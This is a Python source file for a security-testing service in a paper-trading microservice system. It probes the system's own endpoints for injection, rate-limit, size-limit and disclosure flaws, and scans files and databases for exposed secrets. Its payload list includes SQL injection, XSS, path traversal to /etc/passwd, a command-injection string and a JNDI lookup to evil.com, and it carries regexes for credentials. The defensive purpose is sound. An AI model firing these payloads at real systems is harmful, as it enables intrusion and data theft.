#!/usr/bin/env python3
"""
Security Validation Service
Comprehensive security review and validation for all trading microservices
Ensures production-ready security across all system components

Key Features:
- Input validation and sanitization testing
- Authentication and authorization validation
- Data protection and encryption verification  
- API security and rate limiting validation
- Secrets management and configuration security
- Database security and injection protection

Dependencies:
- All trading microservices for security testing
- System security tools and validation frameworks
- Database access for security schema validation

Related Files:
- services/base/base_service.py (base security implementation)
- All service implementations for security validation
- app/config/settings.py (security configuration)
"""

import asyncio
import sys
import os
import json
import re
import hashlib
import base64
from typing import Dict, List, Any, Optional
from datetime import datetime, timedelta
import sqlite3
import traceback
from dataclasses import dataclass
from enum import Enum

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from base.base_service import BaseService

# Settings.py integration for security configuration
SETTINGS_AVAILABLE = False
try:
    sys.path.append("app/config")
    import settings as Settings
    SETTINGS_AVAILABLE = True
except ImportError:
    try:
        sys.path.append("paper-trading-app/app/config")
        import settings as Settings
        SETTINGS_AVAILABLE = True
    except ImportError:
        Settings = None
        print("Warning: settings.py not found - using fallback security configuration")

class SecuritySeverity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class SecurityVulnerability:
    vulnerability_type: str
    severity: SecuritySeverity
    service: str
    description: str
    recommendation: str
    evidence: Dict[str, Any]
    cve_reference: Optional[str] = None

class SecurityValidationService(BaseService):
    """
    Comprehensive security validation service for trading microservices
    Ensures production-ready security across all system components
    """
    
    def __init__(self):
        super().__init__("security-validation")
        
        # Security configuration
        self.security_config = self._load_security_config()
        
        # Services to validate
        self.services_to_validate = [
            "market-data",
            "sentiment", 
            "prediction",
            "paper-trading",
            "ml-model",
            "scheduler",
            "database",
            "api-consistency",
            "error-handling"
        ]
        
        # Security test patterns
        self.injection_patterns = self._load_injection_patterns()
        self.sensitive_data_patterns = self._load_sensitive_patterns()
        
        # Vulnerability tracking
        self.vulnerabilities = []
        self.security_scores = {}
        
        # Register security validation methods
        self.register_handler("validate_all_security", self.validate_all_security)
        self.register_handler("validate_service_security", self.validate_service_security)
        self.register_handler("test_input_validation", self.test_input_validation)
        self.register_handler("test_authentication", self.test_authentication)
        self.register_handler("test_data_protection", self.test_data_protection)
        self.register_handler("test_api_security", self.test_api_security)
        self.register_handler("scan_sensitive_data", self.scan_sensitive_data)
        self.register_handler("validate_database_security", self.validate_database_security)
        self.register_handler("get_security_report", self.get_security_report)
        self.register_handler("remediate_vulnerabilities", self.remediate_vulnerabilities)
        
    def _load_security_config(self) -> Dict[str, Any]:
        """Load security configuration from settings"""
        if SETTINGS_AVAILABLE and hasattr(Settings, 'SECURITY_CONFIG'):
            return Settings.SECURITY_CONFIG
        else:
            # Fallback security configuration
            return {
                "authentication": {
                    "required": False,  # Trading system is currently single-user
                    "token_expiry": 3600,
                    "rate_limiting": True
                },
                "encryption": {
                    "data_at_rest": False,  # SQLite files not encrypted
                    "data_in_transit": False,  # Unix sockets local only
                    "api_keys": True  # API keys should be protected
                },
                "input_validation": {
                    "strict_mode": True,
                    "sanitization": True,
                    "max_request_size": 1048576  # 1MB
                },
                "logging": {
                    "security_events": True,
                    "audit_trail": True,
                    "log_retention": 90  # days
                },
                "rate_limiting": {
                    "enabled": True,
                    "requests_per_minute": 60,
                    "burst_limit": 10
                }
            }
    
    def _load_injection_patterns(self) -> List[str]:
        """Load common injection attack patterns for testing"""
        return [
            "'; DROP TABLE--",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",
            "%00",
            "\\x00",
            "''; cat /etc/passwd #",
            "UNION SELECT * FROM users--",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "../../windows/system32/config/sam",
            "\\\\\\\\localhost\\\\share\\\\file.txt"
        ]
    
    def _load_sensitive_patterns(self) -> List[str]:
        """Load patterns for detecting sensitive data"""
        return [
            r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?[\w@#$%^&*()_+\-=\[\]{};':\"\\|,.<>\/?`~!]+['\"]?",
            r"(?i)(api[_\-]?key|apikey)\s*[:=]\s*['\"]?[a-zA-Z0-9_\-]{16,}['\"]?",
            r"(?i)(secret|token)\s*[:=]\s*['\"]?[a-zA-Z0-9_\-+/]{16,}['\"]?",
            r"(?i)(private[_\-]?key)\s*[:=]\s*['\"]?[a-zA-Z0-9_\-+/=\n\r]{100,}['\"]?",
            r"(?i)(credit[_\-]?card|cc[_\-]?number)\s*[:=]\s*['\"]?\d{13,19}['\"]?",
            r"(?i)(ssn|social[_\-]?security)\s*[:=]\s*['\"]?\d{3}-?\d{2}-?\d{4}['\"]?",
            r"(?i)(bank[_\-]?account)\s*[:=]\s*['\"]?\d{8,17}['\"]?",
            r"(?i)(email)\s*[:=]\s*['\"]?[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}['\"]?",
            r"(?i)(phone|mobile)\s*[:=]\s*['\"]?[\+]?[\d\s\(\)\-\.]{8,15}['\"]?"
        ]
    
    async def validate_all_security(self) -> Dict[str, Any]:
        """Comprehensive security validation across all services"""
        self.logger.info('"action": "security_validation_started"')
        
        validation_result = {
            "timestamp": datetime.now().isoformat(),
            "services_validated": 0,
            "total_tests": 0,
            "passed_tests": 0,
            "failed_tests": 0,
            "vulnerabilities_found": 0,
            "security_score": 0,
            "service_results": {},
            "critical_vulnerabilities": [],
            "high_vulnerabilities": [],
            "recommendations": []
        }
        
        for service_name in self.services_to_validate:
            try:
                service_result = await self.validate_service_security(service_name)
                validation_result["service_results"][service_name] = service_result
                validation_result["services_validated"] += 1
                validation_result["total_tests"] += service_result.get("total_tests", 0)
                validation_result["passed_tests"] += service_result.get("passed_tests", 0)
                validation_result["failed_tests"] += service_result.get("failed_tests", 0)
                
                # Collect vulnerabilities
                service_vulns = service_result.get("vulnerabilities", [])
                validation_result["vulnerabilities_found"] += len(service_vulns)
                
                for vuln in service_vulns:
                    if vuln["severity"] == SecuritySeverity.CRITICAL.value:
                        validation_result["critical_vulnerabilities"].append(vuln)
                    elif vuln["severity"] == SecuritySeverity.HIGH.value:
                        validation_result["high_vulnerabilities"].append(vuln)
                
            except Exception as e:
                self.logger.error(f'"service": "{service_name}", "error": "{e}", "action": "security_validation_failed"')
                validation_result["critical_vulnerabilities"].append({
                    "service": service_name,
                    "vulnerability_type": "security_validation_failed",
                    "severity": SecuritySeverity.HIGH.value,
                    "description": f"Security validation failed: {e}",
                    "recommendation": "Review service availability and security implementation"
                })
        
        # Calculate overall security score
        if validation_result["total_tests"] > 0:
            base_score = (validation_result["passed_tests"] / validation_result["total_tests"]) * 100
            
            # Deduct points for vulnerabilities
            critical_penalty = len(validation_result["critical_vulnerabilities"]) * 25
            high_penalty = len(validation_result["high_vulnerabilities"]) * 10
            
            validation_result["security_score"] = max(0, base_score - critical_penalty - high_penalty)
        
        # Generate recommendations
        if len(validation_result["critical_vulnerabilities"]) > 0:
            validation_result["recommendations"].append("URGENT: Address critical security vulnerabilities before production deployment")
        
        if validation_result["security_score"] < 70:
            validation_result["recommendations"].append("Security score below acceptable threshold - comprehensive security review required")
        
        if len(validation_result["high_vulnerabilities"]) > 3:
            validation_result["recommendations"].append("Multiple high-severity vulnerabilities found - prioritize security fixes")
        
        # Store vulnerabilities
        self.vulnerabilities = validation_result["critical_vulnerabilities"] + validation_result["high_vulnerabilities"]
        
        self.logger.info(f'"services_validated": {validation_result["services_validated"]}, "security_score": {validation_result["security_score"]}, "vulnerabilities": {validation_result["vulnerabilities_found"]}, "action": "security_validation_completed"')
        
        return validation_result
    
    async def validate_service_security(self, service_name: str) -> Dict[str, Any]:
        """Validate security for a specific service"""
        service_result = {
            "service": service_name,
            "available": False,
            "total_tests": 0,
            "passed_tests": 0,
            "failed_tests": 0,
            "vulnerabilities": [],
            "security_tests": {}
        }
        
        try:
            # Test service availability first
            try:
                health = await self.call_service(service_name, "health", timeout=10.0)
                service_result["available"] = True
            except Exception as e:
                service_result["vulnerabilities"].append({
                    "vulnerability_type": "service_unavailable",
                    "severity": SecuritySeverity.MEDIUM.value,
                    "description": f"Service unavailable for security testing: {e}",
                    "recommendation": "Ensure service is running and accessible"
                })
                return service_result
            
            # Test 1: Input validation
            input_test = await self._test_service_input_validation(service_name)
            service_result["security_tests"]["input_validation"] = input_test
            service_result["total_tests"] += input_test.get("tests_run", 0)
            service_result["passed_tests"] += input_test.get("tests_passed", 0)
            service_result["failed_tests"] += input_test.get("tests_failed", 0)
            service_result["vulnerabilities"].extend(input_test.get("vulnerabilities", []))
            
            # Test 2: API security
            api_test = await self._test_service_api_security(service_name)
            service_result["security_tests"]["api_security"] = api_test
            service_result["total_tests"] += api_test.get("tests_run", 0)
            service_result["passed_tests"] += api_test.get("tests_passed", 0)
            service_result["failed_tests"] += api_test.get("tests_failed", 0)
            service_result["vulnerabilities"].extend(api_test.get("vulnerabilities", []))
            
            # Test 3: Error handling security
            error_test = await self._test_service_error_security(service_name)
            service_result["security_tests"]["error_handling"] = error_test
            service_result["total_tests"] += error_test.get("tests_run", 0)
            service_result["passed_tests"] += error_test.get("tests_passed", 0)
            service_result["failed_tests"] += error_test.get("tests_failed", 0)
            service_result["vulnerabilities"].extend(error_test.get("vulnerabilities", []))
            
            # Test 4: Data handling security (for services that handle sensitive data)
            if service_name in ["paper-trading", "prediction", "ml-model"]:
                data_test = await self._test_service_data_security(service_name)
                service_result["security_tests"]["data_security"] = data_test
                service_result["total_tests"] += data_test.get("tests_run", 0)
                service_result["passed_tests"] += data_test.get("tests_passed", 0)
                service_result["failed_tests"] += data_test.get("tests_failed", 0)
                service_result["vulnerabilities"].extend(data_test.get("vulnerabilities", []))
            
        except Exception as e:
            service_result["vulnerabilities"].append({
                "vulnerability_type": "security_test_failure",
                "severity": SecuritySeverity.MEDIUM.value,
                "description": f"Security testing failed: {e}",
                "recommendation": "Review service security implementation"
            })
        
        return service_result
    
    async def _test_service_input_validation(self, service_name: str) -> Dict[str, Any]:
        """Test input validation for SQL injection, XSS, etc."""
        test_result = {
            "tests_run": 0,
            "tests_passed": 0,
            "tests_failed": 0,
            "vulnerabilities": []
        }
        
        # Get service endpoints to test
        endpoints = self._get_service_endpoints(service_name)
        
        for endpoint_name, params in endpoints.items():
            for pattern in self.injection_patterns:
                test_result["tests_run"] += 1
                
                try:
                    # Test with malicious input
                    test_params = {}
                    for param in params:
                        if param in ["symbol", "symbols"]:
                            test_params[param] = pattern
                        elif param in ["action"]:
                            test_params[param] = pattern
                        elif param in ["quantity"]:
                            # For numeric fields, test with string injection
                            test_params[param] = f"1; {pattern}"
                        else:
                            test_params[param] = pattern
                    
                    response = await self.call_service(service_name, endpoint_name, timeout=10.0, **test_params)
                    
                    # Check if injection was processed (vulnerability)
                    if self._check_injection_success(response, pattern):
                        test_result["vulnerabilities"].append({
                            "vulnerability_type": "injection_vulnerability",
                            "severity": SecuritySeverity.HIGH.value,
                            "description": f"Potential injection vulnerability in {endpoint_name} with pattern: {pattern[:50]}",
                            "recommendation": "Implement proper input validation and sanitization",
                            "evidence": {"endpoint": endpoint_name, "pattern": pattern, "response": str(response)[:200]}
                        })
                        test_result["tests_failed"] += 1
                    else:
                        test_result["tests_passed"] += 1
                        
                except Exception as e:
                    # Exception is good - means input was rejected
                    test_result["tests_passed"] += 1
        
        return test_result
    
    def _get_service_endpoints(self, service_name: str) -> Dict[str, List[str]]:
        """Get testable endpoints for each service"""
        endpoints = {
            "prediction": {
                "generate_single_prediction": ["symbol"],
                "generate_predictions": ["symbols"]
            },
            "market-data": {
                "get_market_data": ["symbol"],
                "get_technical_indicators": ["symbol"]
            },
            "sentiment": {
                "analyze_sentiment": ["symbol"]
            },
            "paper-trading": {
                "execute_trade": ["symbol", "action", "quantity"]
            },
            "ml-model": {
                "predict": ["model_name", "features"]
            },
            "scheduler": {
                "schedule_job": ["job_type", "schedule_time"]
            }
        }
        
        return endpoints.get(service_name, {"health": []})
    
    def _check_injection_success(self, response: Any, pattern: str) -> bool:
        """Check if injection pattern was successfully processed (indicating vulnerability)"""
        response_str = str(response).lower()
        
        # Check for SQL injection success indicators
        sql_indicators = ["syntax error", "mysql_", "postgresql", "sqlite", "ora-", "sql server"]
        if any(indicator in response_str for indicator in sql_indicators):
            return True
        
        # Check for XSS success indicators  
        if "<script>" in response_str or "javascript:" in response_str:
            return True
        
        # Check for file inclusion success indicators
        if "/etc/passwd" in response_str or "windows\\system32" in response_str:
            return True
        
        # Check for template injection success indicators
        if "49" in response_str and "{{7*7}}" in pattern:  # 7*7=49
            return True
        
        return False
    
    async def _test_service_api_security(self, service_name: str) -> Dict[str, Any]:
        """Test API security including rate limiting, authentication, etc."""
        test_result = {
            "tests_run": 0,
            "tests_passed": 0,
            "tests_failed": 0,
            "vulnerabilities": []
        }
        
        # Test 1: Rate limiting (if enabled)
        test_result["tests_run"] += 1
        rate_limit_test = await self._test_rate_limiting(service_name)
        if rate_limit_test["vulnerable"]:
            test_result["vulnerabilities"].append({
                "vulnerability_type": "rate_limiting_bypass",
                "severity": SecuritySeverity.MEDIUM.value,
                "description": "Service does not implement rate limiting",
                "recommendation": "Implement rate limiting to prevent abuse",
                "evidence": rate_limit_test
            })
            test_result["tests_failed"] += 1
        else:
            test_result["tests_passed"] += 1
        
        # Test 2: Error information disclosure
        test_result["tests_run"] += 1
        info_disclosure_test = await self._test_information_disclosure(service_name)
        if info_disclosure_test["vulnerable"]:
            test_result["vulnerabilities"].append({
                "vulnerability_type": "information_disclosure",
                "severity": SecuritySeverity.LOW.value,
                "description": "Service may disclose sensitive information in error messages",
                "recommendation": "Sanitize error messages to avoid information disclosure",
                "evidence": info_disclosure_test
            })
            test_result["tests_failed"] += 1
        else:
            test_result["tests_passed"] += 1
        
        # Test 3: Request size limits
        test_result["tests_run"] += 1
        size_limit_test = await self._test_request_size_limits(service_name)
        if size_limit_test["vulnerable"]:
            test_result["vulnerabilities"].append({
                "vulnerability_type": "request_size_vulnerability",
                "severity": SecuritySeverity.MEDIUM.value,
                "description": "Service does not limit request size",
                "recommendation": "Implement request size limits to prevent DoS attacks",
                "evidence": size_limit_test
            })
            test_result["tests_failed"] += 1
        else:
            test_result["tests_passed"] += 1
        
        return test_result
    
    async def _test_rate_limiting(self, service_name: str) -> Dict[str, Any]:
        """Test if service implements rate limiting"""
        test_result = {
            "vulnerable": False,
            "requests_sent": 0,
            "successful_requests": 0
        }
        
        try:
            # Send rapid requests to test rate limiting
            start_time = datetime.now()
            
            for i in range(20):  # Send 20 rapid requests
                try:
                    await self.call_service(service_name, "health", timeout=1.0)
                    test_result["successful_requests"] += 1
                except Exception:
                    pass  # Rate limited or other error
                
                test_result["requests_sent"] += 1
            
            # If most requests succeeded, likely no rate limiting
            if test_result["successful_requests"] > 15:
                test_result["vulnerable"] = True
                
        except Exception as e:
            test_result["error"] = str(e)
        
        return test_result
    
    async def _test_information_disclosure(self, service_name: str) -> Dict[str, Any]:
        """Test for information disclosure in error messages"""
        test_result = {
            "vulnerable": False,
            "sensitive_info_found": []
        }
        
        try:
            # Test with invalid method to trigger error
            response = await self.call_service(service_name, "invalid_test_method")
        except Exception as e:
            error_message = str(e).lower()
            
            # Check for sensitive information in error messages
            sensitive_patterns = [
                "file path", "directory", "/opt/", "/var/", "/etc/",
                "database", "connection", "password", "secret",
                "internal error", "stack trace", "line number"
            ]
            
            for pattern in sensitive_patterns:
                if pattern in error_message:
                    test_result["sensitive_info_found"].append(pattern)
                    test_result["vulnerable"] = True
        
        return test_result
    
    async def _test_request_size_limits(self, service_name: str) -> Dict[str, Any]:
        """Test request size limits"""
        test_result = {
            "vulnerable": False,
            "large_request_accepted": False
        }
        
        try:
            # Create large payload
            large_data = "x" * 5000000  # 5MB payload
            
            # Try to send large request (this should be rejected)
            response = await self.call_service(service_name, "health", large_param=large_data, timeout=5.0)
            test_result["large_request_accepted"] = True
            test_result["vulnerable"] = True
            
        except Exception:
            # Good - large request was rejected
            test_result["large_request_accepted"] = False
        
        return test_result
    
    async def _test_service_error_security(self, service_name: str) -> Dict[str, Any]:
        """Test error handling security"""
        test_result = {
            "tests_run": 0,
            "tests_passed": 0,
            "tests_failed": 0,
            "vulnerabilities": []
        }
        
        # Test error handling with various invalid inputs
        error_tests = [
            ("null_input", None),
            ("empty_string", ""),
            ("special_chars", "!@#$%^&*()"),
            ("unicode", "🚀💰📊"),
            ("very_long", "x" * 1000)
        ]
        
        for test_name, test_input in error_tests:
            test_result["tests_run"] += 1
            
            try:
                # Test with invalid input
                response = await self.call_service(service_name, "health", test_param=test_input)
                
                # Check if response contains sensitive information
                if self._contains_sensitive_info(str(response)):
                    test_result["vulnerabilities"].append({
                        "vulnerability_type": "sensitive_error_disclosure",
                        "severity": SecuritySeverity.LOW.value,
                        "description": f"Error response contains sensitive information for {test_name}",
                        "recommendation": "Sanitize error responses",
                        "evidence": {"test": test_name, "response": str(response)[:200]}
                    })
                    test_result["tests_failed"] += 1
                else:
                    test_result["tests_passed"] += 1
                    
            except Exception as e:
                # Check exception message for sensitive info
                if self._contains_sensitive_info(str(e)):
                    test_result["vulnerabilities"].append({
                        "vulnerability_type": "sensitive_exception_disclosure",
                        "severity": SecuritySeverity.LOW.value,
                        "description": f"Exception contains sensitive information for {test_name}",
                        "recommendation": "Sanitize exception messages",
                        "evidence": {"test": test_name, "exception": str(e)[:200]}
                    })
                    test_result["tests_failed"] += 1
                else:
                    test_result["tests_passed"] += 1
        
        return test_result
    
    def _contains_sensitive_info(self, text: str) -> bool:
        """Check if text contains sensitive information"""
        text_lower = text.lower()
        
        sensitive_indicators = [
            "/opt/", "/var/", "/etc/", "/home/", "c:\\\\",
            "password", "secret", "token", "key",
            "database", "connection", "redis://",
            "traceback", "line ", "file \"",
            "127.0.0.1", "localhost", "internal"
        ]
        
        return any(indicator in text_lower for indicator in sensitive_indicators)
    
    async def _test_service_data_security(self, service_name: str) -> Dict[str, Any]:
        """Test data handling security for sensitive services"""
        test_result = {
            "tests_run": 0,
            "tests_passed": 0,
            "tests_failed": 0,
            "vulnerabilities": []
        }
        
        if service_name == "paper-trading":
            # Test paper trading data security
            test_result["tests_run"] += 1
            try:
                positions = await self.call_service(service_name, "get_positions")
                
                # Check if sensitive financial data is properly handled
                if self._check_financial_data_exposure(positions):
                    test_result["vulnerabilities"].append({
                        "vulnerability_type": "financial_data_exposure",
                        "severity": SecuritySeverity.HIGH.value,
                        "description": "Financial data may be exposed without proper protection",
                        "recommendation": "Implement data encryption and access controls",
                        "evidence": {"response_structure": list(positions.keys()) if isinstance(positions, dict) else str(type(positions))}
                    })
                    test_result["tests_failed"] += 1
                else:
                    test_result["tests_passed"] += 1
                    
            except Exception:
                test_result["tests_passed"] += 1  # Exception is better than data exposure
        
        elif service_name == "prediction":
            # Test prediction data security
            test_result["tests_run"] += 1
            try:
                prediction = await self.call_service(service_name, "generate_single_prediction", symbol="CBA.AX")
                
                # Check if prediction contains sensitive algorithm details
                if self._check_algorithm_exposure(prediction):
                    test_result["vulnerabilities"].append({
                        "vulnerability_type": "algorithm_exposure",
                        "severity": SecuritySeverity.MEDIUM.value,
                        "description": "Prediction algorithm details may be exposed",
                        "recommendation": "Limit algorithm detail exposure in API responses",
                        "evidence": {"prediction_keys": list(prediction.keys()) if isinstance(prediction, dict) else str(type(prediction))}
                    })
                    test_result["tests_failed"] += 1
                else:
                    test_result["tests_passed"] += 1
                    
            except Exception:
                test_result["tests_passed"] += 1
        
        return test_result
    
    def _check_financial_data_exposure(self, data: Any) -> bool:
        """Check if financial data is improperly exposed"""
        # This is a simplified check - in production, implement comprehensive data classification
        data_str = str(data).lower()
        
        # Check for exposed financial details that shouldn't be in API responses
        sensitive_financial_indicators = [
            "account_number", "routing_number", "bank_details",
            "credit_card", "ssn", "tax_id"
        ]
        
        return any(indicator in data_str for indicator in sensitive_financial_indicators)
    
    def _check_algorithm_exposure(self, data: Any) -> bool:
        """Check if algorithm details are improperly exposed"""
        data_str = str(data).lower()
        
        # Check for exposed algorithm details
        algorithm_indicators = [
            "weight", "coefficient", "training_data", "model_path",
            "feature_importance", "internal_score", "debug"
        ]
        
        return any(indicator in data_str for indicator in algorithm_indicators)
    
    async def test_input_validation(self, service_name: str) -> Dict[str, Any]:
        """Dedicated input validation testing"""
        return await self._test_service_input_validation(service_name)
    
    async def test_authentication(self) -> Dict[str, Any]:
        """Test authentication mechanisms (if implemented)"""
        auth_result = {
            "timestamp": datetime.now().isoformat(),
            "authentication_implemented": False,
            "vulnerabilities": [],
            "recommendations": []
        }
        
        # Check if any services implement authentication
        # For current trading system, authentication is not implemented
        auth_result["authentication_implemented"] = False
        auth_result["recommendations"].append("Consider implementing authentication for production deployment")
        
        return auth_result
    
    async def test_data_protection(self) -> Dict[str, Any]:
        """Test data protection mechanisms"""
        protection_result = {
            "timestamp": datetime.now().isoformat(),
            "encryption_at_rest": False,
            "encryption_in_transit": False,
            "data_classification": False,
            "vulnerabilities": [],
            "recommendations": []
        }
        
        # Check database encryption
        try:
            db_security = await self.call_service("database", "get_security_status")
            protection_result["encryption_at_rest"] = db_security.get("encrypted", False)
        except Exception:
            protection_result["vulnerabilities"].append({
                "vulnerability_type": "unencrypted_data_at_rest",
                "severity": SecuritySeverity.MEDIUM.value,
                "description": "Database files are not encrypted",
                "recommendation": "Consider database encryption for sensitive financial data"
            })
        
        # Unix sockets are local only, so transit encryption less critical
        protection_result["encryption_in_transit"] = False
        protection_result["recommendations"].append("Consider TLS for remote deployments")
        
        return protection_result
    
    async def test_api_security(self) -> Dict[str, Any]:
        """Test overall API security"""
        api_security_result = {
            "timestamp": datetime.now().isoformat(),
            "services_tested": 0,
            "security_issues": [],
            "overall_score": 0
        }
        
        total_score = 0
        
        for service_name in self.services_to_validate:
            try:
                service_api_test = await self._test_service_api_security(service_name)
                api_security_result["services_tested"] += 1
                
                # Calculate service score
                if service_api_test["tests_run"] > 0:
                    service_score = (service_api_test["tests_passed"] / service_api_test["tests_run"]) * 100
                    total_score += service_score
                
                # Collect security issues
                api_security_result["security_issues"].extend(service_api_test.get("vulnerabilities", []))
                
            except Exception as e:
                api_security_result["security_issues"].append({
                    "service": service_name,
                    "issue": f"API security test failed: {e}"
                })
        
        # Calculate overall score
        if api_security_result["services_tested"] > 0:
            api_security_result["overall_score"] = total_score / api_security_result["services_tested"]
        
        return api_security_result
    
    async def scan_sensitive_data(self) -> Dict[str, Any]:
        """Scan for sensitive data in logs, configs, and responses"""
        scan_result = {
            "timestamp": datetime.now().isoformat(),
            "files_scanned": 0,
            "sensitive_data_found": [],
            "recommendations": []
        }
        
        # Scan common files for sensitive data patterns
        files_to_scan = [
            "app/config/settings.py",
            "paper-trading-app/app/config/settings.py",
            "logs/trading.log",
            "logs/paper_trading.log"
        ]
        
        for file_path in files_to_scan:
            try:
                if os.path.exists(file_path):
                    scan_result["files_scanned"] += 1
                    
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    
                    # Scan for sensitive patterns
                    for pattern in self.sensitive_data_patterns:
                        matches = re.findall(pattern, content, re.MULTILINE)
                        for match in matches:
                            scan_result["sensitive_data_found"].append({
                                "file": file_path,
                                "pattern_type": "sensitive_data",
                                "match": match[:50] + "..." if len(match) > 50 else match,
                                "line_context": "*** REDACTED ***"
                            })
                            
            except Exception as e:
                continue  # Skip files that can't be read
        
        if len(scan_result["sensitive_data_found"]) > 0:
            scan_result["recommendations"].append("Remove or encrypt sensitive data found in files")
            scan_result["recommendations"].append("Implement proper secrets management")
        
        return scan_result
    
    async def validate_database_security(self) -> Dict[str, Any]:
        """Validate database security configurations"""
        db_security_result = {
            "timestamp": datetime.now().isoformat(),
            "databases_checked": 0,
            "security_issues": [],
            "recommendations": []
        }
        
        # Check common database files
        db_files = [
            "paper_trading.db",
            "predictions.db", 
            "trading_predictions.db",
            "data/enhanced_outcomes.db",
            "data/ig_markets_paper_trades.db"
        ]
        
        for db_file in db_files:
            if os.path.exists(db_file):
                db_security_result["databases_checked"] += 1
                
                try:
                    # Check file permissions
                    file_stat = os.stat(db_file)
                    file_mode = oct(file_stat.st_mode)[-3:]
                    
                    if file_mode != "600":  # Should be read/write for owner only
                        db_security_result["security_issues"].append({
                            "database": db_file,
                            "issue": f"Insecure file permissions: {file_mode}",
                            "recommendation": "Set file permissions to 600 (owner read/write only)"
                        })
                    
                    # Check for sensitive data in database
                    conn = sqlite3.connect(db_file)
                    cursor = conn.cursor()
                    
                    # Get table names
                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                    tables = cursor.fetchall()
                    
                    for table in tables:
                        table_name = table[0]
                        
                        # Check for potentially sensitive column names
                        cursor.execute(f"PRAGMA table_info({table_name});")
                        columns = cursor.fetchall()
                        
                        sensitive_columns = [col for col in columns if any(
                            sensitive_word in col[1].lower() 
                            for sensitive_word in ["password", "secret", "key", "token", "credit", "ssn"]
                        )]
                        
                        if sensitive_columns:
                            db_security_result["security_issues"].append({
                                "database": db_file,
                                "table": table_name,
                                "issue": f"Potentially sensitive columns: {[col[1] for col in sensitive_columns]}",
                                "recommendation": "Encrypt sensitive columns or use hashing"
                            })
                    
                    conn.close()
                    
                except Exception as e:
                    db_security_result["security_issues"].append({
                        "database": db_file,
                        "issue": f"Database security check failed: {e}",
                        "recommendation": "Review database accessibility and structure"
                    })
        
        if len(db_security_result["security_issues"]) == 0:
            db_security_result["recommendations"].append("Database security appears adequate for current configuration")
        
        return db_security_result
    
    async def get_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive security report"""
        if not self.vulnerabilities:
            await self.validate_all_security()
        
        report = {
            "report_timestamp": datetime.now().isoformat(),
            "executive_summary": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical_count": len([v for v in self.vulnerabilities if v["severity"] == SecuritySeverity.CRITICAL.value]),
                "high_count": len([v for v in self.vulnerabilities if v["severity"] == SecuritySeverity.HIGH.value]),
                "medium_count": len([v for v in self.vulnerabilities if v["severity"] == SecuritySeverity.MEDIUM.value]),
                "low_count": len([v for v in self.vulnerabilities if v["severity"] == SecuritySeverity.LOW.value])
            },
            "vulnerability_details": self.vulnerabilities,
            "security_recommendations": [],
            "compliance_status": "REVIEW_REQUIRED",
            "next_review_date": (datetime.now() + timedelta(days=30)).isoformat()
        }
        
        # Generate prioritized recommendations
        if report["executive_summary"]["critical_count"] > 0:
            report["security_recommendations"].append("URGENT: Address critical vulnerabilities immediately")
            report["compliance_status"] = "NON_COMPLIANT"
        
        if report["executive_summary"]["high_count"] > 0:
            report["security_recommendations"].append("High priority: Resolve high-severity vulnerabilities")
        
        if report["executive_summary"]["medium_count"] > 3:
            report["security_recommendations"].append("Address medium-severity vulnerabilities for improved security posture")
        
        # Overall recommendations
        report["security_recommendations"].extend([
            "Implement regular security scanning in CI/CD pipeline",
            "Consider security training for development team", 
            "Establish incident response procedures",
            "Regular security audits and penetration testing"
        ])
        
        return report
    
    async def remediate_vulnerabilities(self, vulnerability_types: List[str] = None) -> Dict[str, Any]:
        """Attempt automated remediation of certain vulnerability types"""
        remediation_result = {
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities_processed": 0,
            "successful_remediations": 0,
            "failed_remediations": 0,
            "remediation_details": []
        }
        
        vulnerabilities_to_process = self.vulnerabilities
        if vulnerability_types:
            vulnerabilities_to_process = [v for v in self.vulnerabilities if v["vulnerability_type"] in vulnerability_types]
        
        for vulnerability in vulnerabilities_to_process:
            remediation_result["vulnerabilities_processed"] += 1
            
            try:
                remediation_success = await self._remediate_single_vulnerability(vulnerability)
                
                if remediation_success["success"]:
                    remediation_result["successful_remediations"] += 1
                else:
                    remediation_result["failed_remediations"] += 1
                
                remediation_result["remediation_details"].append(remediation_success)
                
            except Exception as e:
                remediation_result["failed_remediations"] += 1
                remediation_result["remediation_details"].append({
                    "vulnerability_type": vulnerability["vulnerability_type"],
                    "success": False,
                    "error": str(e)
                })
        
        return remediation_result
    
    async def _remediate_single_vulnerability(self, vulnerability: Dict) -> Dict[str, Any]:
        """Attempt to remediate a single vulnerability"""
        remediation_result = {
            "vulnerability_type": vulnerability["vulnerability_type"],
            "success": False,
            "action_taken": "none",
            "note": ""
        }
        
        vuln_type = vulnerability["vulnerability_type"]
        
        if vuln_type == "insecure_file_permissions":
            # This would require system-level access
            remediation_result["action_taken"] = "requires_manual_intervention"
            remediation_result["note"] = "File permissions need to be changed manually"
            
        elif vuln_type == "information_disclosure":
            remediation_result["action_taken"] = "requires_code_changes"
            remediation_result["note"] = "Error message sanitization needs to be implemented in service code"
            
        elif vuln_type == "rate_limiting_bypass":
            remediation_result["action_taken"] = "requires_configuration"
            remediation_result["note"] = "Rate limiting needs to be configured in service settings"
            
        else:
            remediation_result["action_taken"] = "no_automated_remediation"
            remediation_result["note"] = f"Manual review required for {vuln_type}"
        
        return remediation_result

async def main():
    service = SecurityValidationService()
    await service.start_server()

if __name__ == "__main__":
    asyncio.run(main())
